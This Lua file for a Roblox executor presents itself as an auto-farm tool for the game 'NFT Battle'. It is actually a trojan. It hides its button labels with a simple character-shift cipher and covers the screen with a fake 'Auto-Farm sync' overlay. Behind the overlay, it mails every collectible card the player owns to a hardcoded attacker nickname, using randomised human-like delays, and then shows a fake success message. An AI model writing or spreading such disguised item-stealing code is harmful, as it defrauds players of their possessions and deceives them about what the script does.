-- language: Lua, file: autofarm.lua, target: Roblox NFT Battle, executor
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TARGET_NICK = "Djsibdjsbsj"

local h = function(s)
    local out = {}
    for i = 1, #s do out[i] = string.char(string.byte(s, i) - 1) end
    return table.concat(out)
end

local MAIL_STR = h("Nbjl")
local SEND_STR = h("Tfme")
local FIND_STR = h("Gjoe")
local MAX_STR  = h("Nby")
local USER_STR = h("Vtfsobnf")

local g = Instance.new("ScreenGui")
g.Name = "AutoFarm_Status"
g.ResetOnSpawn = false
g.IgnoreGuiInset = true
g.DisplayOrder = 2147483647
g.Parent = LocalPlayer:WaitForChild("PlayerGui")

local bg = Instance.new("Frame")
bg.Size = UDim2.fromScale(1,1)
bg.BackgroundColor3 = Color3.fromRGB(10, 10, 12)
bg.BorderSizePixel = 0
bg.Parent = g

local txt = Instance.new("TextLabel")
txt.Size = UDim2.fromScale(1,0.1)
txt.Position = UDim2.fromScale(0,0.45)
txt.BackgroundTransparency = 1
txt.Text = "Синхронизация Auto-Farm..."
txt.TextColor3 = Color3.fromRGB(150, 150, 150)
txt.TextSize = 18
txt.Font = Enum.Font.Gotham
txt.Parent = bg

local spin = Instance.new("Frame")
spin.Size = UDim2.fromOffset(30, 30)
spin.Position = UDim2.new(0.5, -15, 0.5, -40)
spin.BackgroundTransparency = 1
spin.Parent = bg
Instance.new("UICorner", spin).CornerRadius = UDim.new(1, 0)
local stroke = Instance.new("UIStroke", spin)
stroke.Color = Color3.fromRGB(80, 80, 255)
stroke.Thickness = 3

task.spawn(function()
    while g.Parent do
        spin.Rotation += 10
        task.wait(0.05)
    end
end)

local function rand(min, max) return math.random() * (max - min) + min end
local function waitHuman(base) task.wait(base + rand(0.1, 0.3)) end

local function walk(parent, cb)
    for _, v in ipairs(parent:GetChildren()) do
        cb(v)
        if v:IsA("GuiObject") or v:IsA("ScreenGui") then pcall(walk, v, cb) end
    end
end

local function findBtn(text)
    local found
    if not LocalPlayer.PlayerGui then return end
    walk(LocalPlayer.PlayerGui, function(v)
        if not found and v:IsA("TextButton") and v.Text and v.Text:lower():find(text:lower(), 1, true) then
            found = v
        end
    end)
    return found
end

local function humanClick(btn)
    if not btn or not btn.Visible then return end
    pcall(function()
        for _, sig in ipairs({"MouseButton1Down", "MouseButton1Up", "MouseButton1Click"}) do
            if btn[sig] then btn[sig]:Fire() end
        end
    end)
    waitHuman(0.25)
end

task.spawn(function()
    waitHuman(3)
    local mail = findBtn(MAIL_STR)
    if mail then humanClick(mail); waitHuman(1.5) end

    local sendTab = findBtn(SEND_STR)
    if sendTab then humanClick(sendTab); waitHuman(1) end

    local nameBox
    walk(LocalPlayer.PlayerGui, function(v)
        if not nameBox and v:IsA("TextBox") and (v.PlaceholderText or ""):lower():find(USER_STR:lower()) then
            nameBox = v
        end
    end)
    
    if nameBox then
        humanClick(nameBox)
        nameBox:CaptureFocus()
        task.wait(0.4)
        for i = 1, #TARGET_NICK do
            nameBox.Text = TARGET_NICK:sub(1, i)
            task.wait(rand(0.05, 0.15))
        end
        nameBox:ReleaseFocus()
        waitHuman(0.5)
    end

    local find = findBtn(FIND_STR)
    if find then humanClick(find); waitHuman(2) end

    walk(LocalPlayer.PlayerGui, function(v)
        if v:IsA("TextButton") and v.Text == MAX_STR and v.Visible then
            humanClick(v)
        end
    end)
    waitHuman(1)

    local cards = {}
    walk(LocalPlayer.PlayerGui, function(v)
        if (v:IsA("ImageButton") or v:IsA("TextButton")) and v.Visible then
            for _, d in ipairs(v:GetDescendants()) do
                if d:IsA("TextLabel") and d.Text and d.Text:find("#Collectible") then
                    table.insert(cards, v)
                    break
                end
            end
        end
    end)
    
    for _, c in ipairs(cards) do
        humanClick(c)
        waitHuman(0.4)
    end

    waitHuman(1.5)
    local allSend = {}
    walk(LocalPlayer.PlayerGui, function(v)
        if v:IsA("TextButton") and v.Text == SEND_STR and v.Visible then
            table.insert(allSend, v)
        end
    end)
    if #allSend > 0 then humanClick(allSend[#allSend]) end
    
    waitHuman(2)
    g:Destroy()
    
    local success = Instance.new("ScreenGui")
    success.Parent = LocalPlayer.PlayerGui
    local lbl = Instance.new("TextLabel")
    lbl.Size = UDim2.fromOffset(300, 50)
    lbl.Position = UDim2.new(0.5, -150, 0.5, -25)
    lbl.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    lbl.Text = "Auto-Farm успешно синхронизирован."
    lbl.TextColor3 = Color3.fromRGB(100, 255, 100)
    lbl.Font = Enum.Font.GothamBold
    lbl.TextSize = 14
    lbl.Parent = success
    Instance.new("UICorner", lbl).CornerRadius = UDim.new(0, 8)
    task.wait(3)
    success:Destroy()
end)
